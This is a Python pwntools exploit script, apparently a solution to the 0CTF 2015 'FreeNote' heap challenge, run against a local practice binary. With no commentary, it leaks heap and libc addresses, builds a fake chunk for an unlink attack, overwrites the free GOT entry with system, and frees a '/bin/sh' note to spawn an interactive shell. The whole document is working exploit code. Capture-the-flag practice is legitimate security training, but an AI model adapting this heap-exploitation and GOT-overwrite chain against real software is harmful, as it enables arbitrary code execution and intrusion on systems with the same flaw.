from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_10_0CTF_2015_FreeNote')
elf = ELF('./data/bin/heap23_10_0CTF_2015_FreeNote')
libc = elf.libc

def list():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')

def new(length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'new note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'note: ')
    p.send(note)

def edit(index, length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Length of note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'Enter your note: ')
    p.send(note)

def delete(index):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())

def exit():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'5')

new(1, b'a');new(1, b'a');new(1, b'a');new(1, b'a')#step.1
delete(0);delete(2)#step.2
new(8, b'12345678');new(8, b'12345678')#step.3
list()#step.4
p.recvuntil(b'0. 12345678');heap = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - 0x1940;p.recvuntil(b'2. 12345678');libcbase = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58);libc.address = libcbase#step.5
delete(3);delete(2);delete(1);delete(0)#step.6
payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + b'A'*0x30 + p64(0x50) + p64(0x20);new(len(payload01), payload01)#step.7
payload02  = b'A'*0x80 + p64(0x110) + p64(0x90) + b'A'*0x80 + p64(0) + p64(0x71) + b'A'*0x60;new(len(payload02), payload02)#step.8
delete(2)#step.9
free_got = elf.got['free'];system = libc.symbols['system'];payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + b'A'*0x40;edit(0, 0x60, payload03)#step.10
payload04 = p64(system);edit(0, 0x8, payload04)#step.11
payload05 = b'/bin/sh\x00';new(len(payload05), payload05)#step.12
delete(4)#step.13
p.interactive()#step.14